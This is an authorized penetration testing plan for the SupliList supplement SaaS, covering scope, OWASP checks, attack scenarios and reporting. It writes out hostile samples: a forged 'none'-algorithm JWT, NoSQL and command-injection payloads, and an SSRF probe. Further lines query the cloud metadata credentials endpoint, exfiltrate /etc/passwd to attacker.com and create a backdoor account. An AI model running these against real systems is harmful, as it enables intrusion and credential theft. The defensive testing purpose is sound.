# SupliList - Penetration Testing Plan

**Version:** 1.0.0  
**Date:** 2026-06-16  
**Scope:** Full-stack application security assessment  
**Duration:** 2-3 weeks  
**Engagement Model:** Time & Materials (40 hours estimated)

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Scope Definition](#scope-definition)
3. [Testing Methodology](#testing-methodology)
4. [Test Plan Details](#test-plan-details)
5. [Vulnerability Severity Matrix](#vulnerability-severity-matrix)
6. [Reporting & Remediation](#reporting--remediation)
7. [Timeline & Deliverables](#timeline--deliverables)

---

## Executive Summary

This penetration test is designed to evaluate the security posture of SupliList—a supplement recommendation SaaS platform. The test will identify vulnerabilities in infrastructure, application code, and business processes that could be exploited by malicious actors.

### Objectives

1. **Identify vulnerabilities** in web application and infrastructure
2. **Assess risk** of exploitation and business impact
3. **Validate security controls** implemented during development
4. **Provide remediation roadmap** with prioritized fixes
5. **Document findings** for compliance (GDPR, SOC 2)

### Out of Scope (To Protect Operations)

- Production database direct access (data exfiltration testing)
- Denial of service attacks causing extended outages
- Social engineering or physical security testing
- Third-party service assessments (Stripe, Firebase, Cloudflare)
- Client-side mobile app testing (separate engagement)

---

## Scope Definition

### Systems in Scope

| System | Component | Priority |
|--------|-----------|----------|
| **Web Application** | React frontend (suplilist.app) | Critical |
| | Express.js backend API | Critical |
| | Authentication system (Firebase + Custom JWT) | Critical |
| **Infrastructure** | Cloudflare CDN/WAF | High |
| | AWS ALB & networking | High |
| | Render.com hosting | High |
| **Data Storage** | MongoDB Atlas database | Critical |
| | Redis cache (PII exposure risk) | High |
| | AWS S3 bucket (file storage) | Medium |
| **External Integrations** | Stripe payment gateway | High |
| | Google OAuth | High |
| | Email service (Resend) | Medium |

### Systems Out of Scope

- Firebase Console (Google-managed)
- Cloudflare control plane (SaaS)
- Stripe infrastructure (PCI-compliant)
- Third-party monitoring (Sentry, Datadog)
- Internal CI/CD pipelines (GitHub Actions)

---

## Testing Methodology

### PTES (Penetration Testing Execution Standard)

This engagement follows PTES phases:

```
1. Pre-Engagement Interactions (Week 1, Day 1)
2. Reconnaissance (Week 1, Days 2-3)
3. Scanning & Enumeration (Week 1-2, Days 3-5)
4. Vulnerability Analysis (Week 2, Days 5-7)
5. Exploitation (Week 2-3, Days 7-10)
6. Post-Exploitation (Week 3, Days 10-12)
7. Reporting (Week 3, Days 13-14)
```

### Tools & Techniques

**Reconnaissance:**
- OSINT (public records, GitHub, DNS enumeration)
- nmap, masscan (network scanning)
- SSL/TLS certificate analysis
- DNS recon (subdomains, SPF/DKIM/DMARC)

**Vulnerability Scanning:**
- Burp Suite Professional (web app scanning)
- ZAP (OWASP security analysis)
- Nessus (infrastructure scanning)
- npm audit, Snyk (dependency analysis)

**Exploitation:**
- SQLi payloads (NoSQL injection testing)
- XSS proof-of-concepts
- CSRF token manipulation
- JWT tampering
- Authentication bypass attempts
- Business logic flaws

**Post-Exploitation:**
- Lateral movement testing
- Privilege escalation attempts
- Data exfiltration methods
- Persistence mechanisms

---

## Test Plan Details

### Phase 1: Reconnaissance (Days 1-3)

#### 1.1 Passive Information Gathering

**Objective:** Identify attack surface without active network traffic.

```bash
# DNS enumeration
nslookup suplilist.app
whois suplilist.app
dig suplilist.app +trace

# Subdomain discovery
./amass enum -d suplilist.app -o amass_output.txt

# GitHub repository analysis
git log --all --full-history -- <secret_patterns>
gitleaks scan --source github --repo https://github.com/suplilist/suplilist

# SSL/TLS certificate inspection
ssllabs_grade suplilist.app
testssl.sh suplilist.app

# Web technology fingerprinting
whatruns.com (check frontend tech)
builtwith.com (infrastructure)
```

**Expected Findings:**
- List of domains/subdomains
- Technology stack (React, Express, MongoDB)
- Certificate details (issuer, validity, SANs)
- Potential secrets in public repos

#### 1.2 Active Information Gathering

**Objective:** Map network topology and services.

```bash
# Network scanning
nmap -sV -p- suplilist.app  # Service detection
nmap -A -T4 suplilist.app   # OS detection

# Web server identification
curl -I https://suplilist.app  # Headers

# API endpoint discovery
GET /api/
GET /health
GET /api/swagger
GET /api/graphql

# Rate limit detection
for i in {1..20}; do curl -w "%{http_code}\n" https://suplilist.app/api/; done
```

**Expected Results:**
- Open ports (80, 443, 22)
- Running services (nginx, Node.js)
- Rate limit headers
- API endpoint list

---

### Phase 2: Vulnerability Scanning (Days 3-5)

#### 2.1 OWASP Top 10 Scanning

**Setup Burp Suite:** Intercept & scan all endpoints

```burp
Target: https://suplilist.app
Scope: /api/*
Excluded: /health, /metrics (unless vulnerabilities found)

Scan Type: Crawl and Audit
Active Scan: Full
Session: Cookies + Authorization tokens
```

**Tests to Run:**

```
A01: Broken Access Control
├─ Endpoint enumeration (GET all resources)
├─ Authorization bypass (modify user IDs)
├─ Insecure direct object reference (IDOR)
└─ Test: GET /api/profile/[OTHER_USER_ID]

A02: Cryptographic Failures
├─ Weak algorithms detection
├─ Certificate validation
├─ Insecure TLS configuration
└─ Test: SSLv3, TLS < 1.2, weak ciphers

A03: Injection
├─ SQL injection (NoSQL for MongoDB)
├─ Command injection
├─ LDAP injection
└─ Test payloads:
    • {"$ne": null}
    • admin' --
    • $(whoami)

A04: Insecure Design
├─ Missing security requirements
├─ Authentication flaws
├─ Authorization gaps
└─ Manual testing (business logic)

A05: Security Misconfiguration
├─ Default credentials
├─ Debug endpoints exposed
├─ Unnecessary services running
└─ Test: GET /api/admin, /debug, /console

A06: Vulnerable & Outdated Components
├─ Dependency scanning
├─ Known CVE detection
└─ npm audit results review

A07: Authentication Failures
├─ Weak password policy
├─ Session fixation
├─ Token expiration
└─ Test: JWT exp claim, session timeout

A08: Data Integrity Failures
├─ Webhook signature verification
├─ Insecure deserialization
└─ Test: Stripe webhook tampering

A09: Logging & Monitoring Failures
├─ Error message disclosure
├─ Missing security logging
└─ Test: Trigger 500 errors, check response

A10: SSRF & Known Vulnerabilities
├─ URL validation
├─ Internal service scanning
└─ Test: /api/image?url=http://localhost:6379
```

#### 2.2 API Security Scanning

**Objective:** Test REST API endpoints for common flaws.

```python
# API enumeration
endpoints = [
    "GET /api/auth/me",
    "POST /api/auth/login",
    "POST /api/auth/register",
    "GET /api/profile",
    "GET /api/profile/{id}",
    "PATCH /api/profile",
    "DELETE /api/account",
    "GET /api/supplements",
    "POST /api/supplements",
    "GET /api/stack",
    "POST /api/stack",
    "GET /api/settings",
    "PATCH /api/settings",
    "GET /api/payments/history",
    "POST /api/payments/subscribe",
]

# Test each endpoint for:
# 1. Authentication bypass
# 2. Authorization flaws
# 3. Input validation gaps
# 4. Rate limit circumvention
# 5. Response information disclosure
```

**Expected Vulnerabilities:**
- Missing authentication headers
- Weak token validation
- IDOR in resource endpoints
- SQL/NoSQL injection in search
- XXS in user-controlled fields

#### 2.3 Authentication Testing

```bash
# Test authentication mechanisms
1. Firebase ID token validation
   - Expired tokens accepted?
   - Token signature verification?
   - Custom claims validation?

2. JWT (custom implementation)
   - Algorithm confusion (RS256→HS256)
   - "none" algorithm accepted?
   - Secret brute force feasible?
   - Token expiration enforced?

3. Session management
   - Cookie security flags (HttpOnly, Secure, SameSite)
   - Session fixation possible?
   - Concurrent session limits?

4. Multi-factor authentication
   - TOTP seed reusable?
   - Recovery codes stored securely?
   - Brute force protected?

5. Password reset
   - Token length sufficient (>128 bits)?
   - Token expiration (>5 min)?
   - Sequential token prediction?
```

---

### Phase 3: Vulnerability Analysis (Days 5-7)

#### 3.1 Proof of Concept (PoC) Development

For each discovered vulnerability, develop a PoC demonstrating exploitability:

**Example 1: Authentication Bypass**
```javascript
// If "none" algorithm accepted in JWT
const maliciousToken = jwt.sign(
  { uid: 'attacker@example.com', role: 'admin' },
  '',
  { algorithm: 'none' }
);

// Send request
fetch('https://api.suplilist.app/api/admin/users', {
  headers: { Authorization: `Bearer ${maliciousToken}` }
});
```

**Example 2: IDOR (Insecure Direct Object Reference)**
```javascript
// Attacker modifies user ID in request
const targetUserId = '507f1f77bcf86cd799439011';  // Not their account

fetch(`https://api.suplilist.app/api/profile/${targetUserId}`).then(r => r.json());
// Returns victim's private profile data
```

**Example 3: NoSQL Injection**
```javascript
// POST /api/supplements/search
{
  "query": { "$ne": null },
  "category": { "$ne": null }
}
// Returns all supplements (authorization bypass)
```

#### 3.2 Risk Assessment

For each vulnerability:

```markdown
## Vulnerability: [Name]

**CVSS Score:** 7.5 (High)
**Type:** [Authentication Bypass / Injection / etc]

### Exploitability
- **Attack Vector:** Network/Adjacent/Local
- **Attack Complexity:** Low/High
- **Required Privileges:** None/User/Admin
- **User Interaction:** None/Required
- **Scope:** Unchanged/Changed

### Impact
- **Confidentiality:** High (user data exposed)
- **Integrity:** High (data can be modified)
- **Availability:** High (service disrupted)

### Business Impact
- **Users Affected:** All / Subset
- **Data at Risk:** PII, payment info, health data
- **Regulatory Impact:** GDPR breach, PCI violation
- **Estimated Cost:** $X (if exploited)

### Reproduction Steps
1. Step 1
2. Step 2
3. Step 3

### Proof of Concept
[Code snippet or command]

### Remediation
[Fix recommendation]
```

---

### Phase 4: Exploitation (Days 7-10)

#### 4.1 Attack Scenarios

**Scenario 1: Unauthorized Access to User Data**

```
Goal: Access another user's profile without authorization

Steps:
1. Register attacker account (attacker@malicious.com)
2. Authenticate and obtain JWT token
3. Identify valid user IDs from public API responses
4. Send: GET /api/profile/{victim_user_id}
5. If 200 OK: IDOR vulnerability confirmed
6. Retrieve: email, phone, health preferences, supplement stacks

Business Impact: Privacy violation, GDPR breach, lawsuit risk
```

**Scenario 2: Payment Fraud via Webhook Tampering**

```
Goal: Fraudulently modify subscription without payment

Steps:
1. Intercept Stripe webhook (man-in-the-middle)
2. Modify payment_intent.succeeded to failed
3. Replay webhook to /api/webhooks/stripe
4. If subscription remains active: Signature verification bypass
5. User gets premium access without paying

Business Impact: Revenue loss, fraud exposure, legal liability
```

**Scenario 3: Privilege Escalation to Admin**

```
Goal: Obtain admin privileges from user account

Steps:
1. Authenticate as regular user
2. Intercept token, decode JWT
3. If role is modifiable: Change role to "admin"
4. Re-sign with known secret or algorithm confusion
5. Access admin endpoints: GET /api/admin/users
6. Modify other users' data, access analytics

Business Impact: Full application compromise, data exfiltration
```

#### 4.2 Advanced Testing

**Lateral Movement Testing:**

```bash
# If attacker gains initial foothold in container
# Test: Can they access Redis from application container?
redis-cli -h redis:6379 KEYS "*"

# Test: Can they access MongoDB?
mongo --host mongodb --username admin

# Test: Can they read environment variables?
env | grep SECRET

# Test: Can they access AWS credentials?
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Data Exfiltration Methods:**

```
1. DNS exfiltration
   curl http://attacker.com/?data=$(base64 < /etc/passwd)

2. HTTP beacon with data
   POST /api/metrics with large payload containing secrets

3. Out-of-band channels
   - S3 bucket misconfiguration
   - Unencrypted backup download
```

---

### Phase 5: Post-Exploitation (Days 10-12)

#### 5.1 Persistence Testing

**Objective:** Determine if attacker can maintain access after initial compromise.

```bash
# Can attacker create backdoor admin account?
POST /api/auth/register
{
  "email": "backdoor@suplilist.app",
  "password": "SecurePassword123!",
  "role": "admin"  # Try to override
}

# Can attacker modify code via CI/CD?
curl -X POST https://api.github.com/repos/suplilist/suplilist/commits \
  -H "Authorization: token <stolen_token>" \
  -d '{"message": "Deploy malicious code"}'

# Can attacker create long-lived tokens?
POST /api/auth/create-api-token
{
  "name": "Backdoor Token",
  "expiration": "2030-01-01"
}
```

#### 5.2 Impact Assessment

**Document What Attacker Could Do:**

- [ ] Access all user data (health preferences, stacks)
- [ ] Modify user subscriptions (refund fraud)
- [ ] Download database backups
- [ ] Access payment records (card tokens)
- [ ] Modify supplement recommendations
- [ ] Inject malicious content into recommendations
- [ ] Send phishing emails via Resend
- [ ] Exfiltrate analytics data
- [ ] Modify app code via GitHub
- [ ] Deploy malicious versions to production

---

### Phase 6: Reporting (Days 13-14)

#### 6.1 Vulnerability Report Structure

**Each Vulnerability Includes:**

1. **Executive Summary** (non-technical)
   - What was found
   - Why it matters (business impact)
   - Severity (CVSS score)

2. **Technical Details**
   - Vulnerability classification (OWASP Top 10)
   - Affected systems/endpoints
   - Reproduction steps
   - Proof of concept code

3. **Risk Assessment**
   - Exploitability
   - Business impact
   - Affected user count
   - Data at risk

4. **Remediation**
   - Recommended fix
   - Implementation effort (hours)
   - Verification testing

5. **References**
   - CVE/CWE links
   - Security best practices
   - Code examples

---

## Vulnerability Severity Matrix

### CVSS v3.1 Scoring

| Severity | CVSS Score | Response Time | Examples |
|----------|------------|---------------|-----------
| **Critical** | 9.0-10.0 | Immediate (24h) | RCE, Complete auth bypass, Data breach |
| **High** | 7.0-8.9 | Urgent (1 week) | IDOR, XXS, SQL injection, Privilege escalation |
| **Medium** | 4.0-6.9 | Important (2 weeks) | Weak password policy, Missing CSRF token, Information disclosure |
| **Low** | 0.1-3.9 | Minor (30 days) | Missing security headers, Typos in error messages |

### Remediation SLA

```
Critical: 24 hours to patch
High: 1 week to patch
Medium: 2 weeks to patch
Low: 30 days to patch
```

---

## Reporting & Remediation

### 6.2 Report Delivery

**Deliverables:**

```
1. Executive Summary (2-3 pages)
   ├─ Test scope and timeline
   ├─ Key findings summary
   ├─ Risk rating (overall)
   └─ Recommended next steps

2. Detailed Vulnerability Report (20-40 pages)
   ├─ 1 section per vulnerability
   ├─ Screenshots/PoC for each
   ├─ CVSS scoring
   └─ Remediation recommendations

3. Risk Heat Map
   ├─ Severity distribution chart
   ├─ Exploitability vs. Impact matrix
   └─ Trending data (if repeat tests)

4. Remediation Roadmap
   ├─ Prioritized by severity
   ├─ Implementation effort estimates
   ├─ Verification testing steps
   └─ Success criteria

5. Raw Data (ZIP file)
   ├─ Burp Suite export (.xml)
   ├─ Tool outputs (Nessus, npm audit)
   ├─ Network logs
   └─ Proof-of-concept code
```

### 6.3 Remediation Process

**Timeline:**

```
Week 1: Report Review
├─ Team reviews findings
├─ Clarification questions
├─ Prioritization meeting
└─ Assign ownership

Weeks 2-4: Remediation
├─ Developers fix issues
├─ Code review
├─ Testing
└─ Deployment

Week 5: Verification Testing
├─ Re-test fixed issues
├─ Confirm remediation
├─ Document completion
└─ Sign-off
```

**Remediation Verification Template:**

```markdown
## Vulnerability: [Name]

**Status:** Fixed ✓ / In Progress / Deferred

### What Changed
- Code changes summary
- Configuration updates
- Dependencies updated

### Verification Method
- Re-run test: [command]
- Expected result: [should NOT reproduce]
- Actual result: ✓ Confirmed fixed

### Evidence
- Screenshot showing fix
- Code diff link
- Deployment timestamp

**Verified By:** [Security Lead]  
**Date:** 2026-06-23
```

---

## Timeline & Deliverables

### Pre-Engagement (Day 1)

- [ ] Kick-off meeting with team
- [ ] Scope confirmation and Q&A
- [ ] Account provisioning (test account, VPN access)
- [ ] Rules of engagement signed
- [ ] Security contact established

### Week 1: Reconnaissance & Scanning (Days 1-5)

| Day | Activity | Deliverable |
|-----|----------|-------------
| 1 | Passive recon, kick-off | Recon report |
| 2 | Active scanning setup | Network map |
| 3 | OWASP Top 10 scanning | Initial findings |
| 4 | API endpoint testing | Endpoint inventory |
| 5 | Vulnerability consolidation | Preliminary report |

### Week 2: Exploitation (Days 6-10)

| Day | Activity | Deliverable |
|-----|----------|-------------
| 6 | High-severity PoC | PoC demonstrations |
| 7 | Authentication testing | Auth bypass findings |
| 8 | Business logic testing | IDOR & flaws |
| 9 | Post-exploitation | Impact assessment |
| 10 | Final testing | Comprehensive findings |

### Week 3: Reporting (Days 11-14)

| Day | Activity | Deliverable |
|-----|----------|-------------
| 11 | Report drafting | Draft report |
| 12 | Review & refinement | Final report |
| 13 | Executive presentation | Presentation slides |
| 14 | Closeout | All deliverables |

### Deliverables Checklist

- [ ] Executive summary document
- [ ] Detailed technical report (PDF)
- [ ] Risk heat map (chart)
- [ ] Remediation roadmap
- [ ] Proof-of-concept code (commented)
- [ ] Tool exports (Burp, Nessus)
- [ ] Follow-up test plan
- [ ] Presentation slides

---

## Success Criteria

### For SupliList Team

- [ ] All Critical vulnerabilities identified and tracked
- [ ] At least 1 medium/low finding per system (no false negatives)
- [ ] Actionable remediation recommendations
- [ ] Clear understanding of risk exposure
- [ ] Confidence in security posture

### For Penetration Tester

- [ ] Thorough coverage of all in-scope systems
- [ ] Professional, non-destructive testing
- [ ] Clear documentation of findings
- [ ] Positive working relationship
- [ ] Opportunity for follow-up engagement

---

## Post-Engagement Support

### Follow-Up Retesting

**6-Week Retest (After Remediation)**

```
Scope: Only fixed vulnerabilities
Duration: 2-3 days
Cost: Discounted rate (50% of initial)
Deliverable: Verification report
```

**Annual Penetration Test**

```
Scope: Full-stack retesting
Duration: 2-3 weeks
Cost: Negotiated annual rate
Frequency: Annually (or after major changes)
```

---

## Assumptions & Constraints

### Assumptions

1. **Network connectivity:** Tester has unfiltered internet access to suplilist.app
2. **Test environment:** Production data available for testing (data will be handled securely)
3. **Availability:** Core dev team available for clarification questions (15 min/day)
4. **Authorization:** All stakeholders have approved scope and rules of engagement
5. **Dependencies:** Third-party services (Stripe, Firebase) are accessible

### Constraints

1. **No data exfiltration:** Results will not be removed from secure environment
2. **No denial of service:** Tests will not cause extended outages
3. **No social engineering:** No phone calls or in-person attempts
4. **Time-bounded:** Testing limited to 40-50 hours (2-3 weeks)
5. **Authorized only:** Testing authorized personnel only

---

## Contact Information

**Penetration Test Engagement Lead:**  
- Name: [Security Firm Contact]
- Email: [contact@securityfirm.com]
- Phone: [+1-XXX-XXX-XXXX]
- Emergency: [24/7 number]

**SupliList Security Contact:**  
- Name: [Your Name]
- Email: security@suplilist.app
- Phone: [On-call number]
- Slack: #security

---

## Sign-Off

| Role | Name | Date | Signature |
|------|------|------|-----------|
| SupliList CEO | | | |
| SupliList CTO | | | |
| Security Lead | | | |
| Penetration Tester | | | |

---

**Document Version:** 1.0.0  
**Last Updated:** 2026-06-16  
**Next Review:** Upon completion of initial test + 6-week retest
